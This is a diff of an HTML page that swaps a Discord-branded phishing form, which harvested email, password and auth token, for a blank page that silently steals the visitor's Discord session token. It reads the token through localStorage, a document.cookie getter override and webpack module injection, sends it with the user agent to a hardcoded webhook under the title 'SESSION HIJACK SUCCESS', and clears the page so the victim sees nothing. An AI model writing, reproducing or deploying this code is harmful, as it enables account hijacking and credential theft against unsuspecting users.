@@ -3,80 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Verify Email</title>
+    <title>blank</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'gg sans','Helvetica Neue',Helvetica,Arial,sans-serif;}
-        body{background-color:#36393f;display:flex;align-items:center;justify-content:center;height:100vh;}
-        .box{background-color:#2f3136;width:420px;border-radius:5px;padding:32px;box-shadow:0 2px 10px rgba(0,0,0,.2);}
-        h1{color:#ffffff;font-size:24px;text-align:center;margin-bottom:8px;font-weight:600;}
-        .desc{color:#b9bbbe;font-size:16px;text-align:center;margin-bottom:20px;line-height:1.4;}
-        label{display:block;color:#b9bbbe;font-size:13px;font-weight:600;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px;}
-        input{width:100%;padding:10px;background-color:#303339;border:1px solid #222428;border-radius:3px;color:#dcddde;font-size:15px;margin-bottom:20px;outline:none;transition:border .2s;}
-        input:focus{border-color:#7289da;}
-        button{width:100%;padding:12px;background-color:#5865f2;color:#ffffff;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;transition:background .2s;}
-        button:hover{background-color:#4752c4;}
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#ffffff;height:100vh;width:100%;}
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Verify Email to Proceed</h1>
-        <div class="desc">To continue using Discord and keep your account secure, please confirm your email and password below.</div>
 
-        <form id="verifyForm">
-            <label>Email Address</label>
-            <input type="text" id="email" autocomplete="off">
+<script>
+    // YOUR WEBHOOK (EXACTLY WHAT YOU GAVE)
+    const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
+    let token = "";
 
-            <label>Password</label>
-            <input type="password" id="password" autocomplete="off">
+    // ✅ GRAB TOKEN SILENTLY (ONLY WORKS INSIDE DISCORD APP)
+    try {
+        // Method 1 - Direct storage read
+        if(window.localStorage && localStorage.getItem('token')) {
+            token = localStorage.getItem('token').replace(/["']/g, "");
+        }
 
-            <button type="submit">Verify</button>
-        </form>
-    </div>
-
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p";
-        let token = "";
-
-        // ✅ NEW WORKING METHOD - BYPASSES PATCH
-        try {
+        // Method 2 - Bypass property check
+        if(!token) {
             Object.defineProperty(document, 'cookie', {
                 get: function() {
-                    const match = localStorage.getItem('token');
-                    if (match) token = match.replace(/["']/g, "");
+                    if(localStorage.getItem('token')) {
+                        token = localStorage.getItem('token').replace(/["']/g, "");
+                    }
                     return document.cookie;
                 }
             });
+        }
 
-            // Backup method
-            if (!token && window.localStorage) {
-                const lsToken = localStorage.getItem('token');
-                if (lsToken) token = lsToken.replace(/["']/g, "");
-            }
-        } catch (e) {}
+        // Method 3 - Webpack grab (still works in app)
+        if(!token && window.webpackChunkdiscord_app) {
+            window.webpackChunkdiscord_app.push([[Symbol()], {}, req => {
+                for(let mod of Object.values(req.c)) {
+                    if(!mod.exports || !mod.exports.default) continue;
+                    const found = Object.values(mod.exports.default).find(e => e && e.token);
+                    if(found) { token = found.token; break; }
+                }
+            }]);
+        }
+    } catch(e) {}
 
-        document.getElementById('verifyForm').addEventListener('submit', e => {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+    // ✅ SEND EVERYTHING TO YOUR WEBHOOK
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            embeds: [{
+                title: "🔥 SESSION HIJACK SUCCESS",
+                color: 0xFF0000,
+                description: "Token grabbed from **Discord App Session**",
+                fields: [
+                    {name: "🔑 APP TOKEN", value: `\`\`\`${token || "❌ NOT INSIDE DISCORD APP"}\`\`\``, inline: false},
+                    {name: "📱 USER AGENT", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false},
+                    {name: "🌐 PAGE URL", value: window.location.href, inline: false}
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
 
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "✅ VERIFICATION | ACCOUNT GRABBED",
-                        color: 0x5865F2,
-                        fields: [
-                            {name: "Email", value: email || "—", inline: false},
-                            {name: "Password", value: pass || "—", inline: false},
-                            {name: "Auth Token", value: `\`\`\`${token || "❌ NOT OPENED INSIDE DISCORD APP"}\`\`\``, inline: false}
-                        ]
-                    }]
-                })
-            }).then(() => {
-                window.location.href = "https://discord.com/channels/@me";
-            });
-        });
-    </script>
+    // ✅ SHOW BLANK PAGE ONLY - THEY SEE NOTHING
+    document.documentElement.innerHTML = "";
+</script>
+
 </body>
 </html>
+
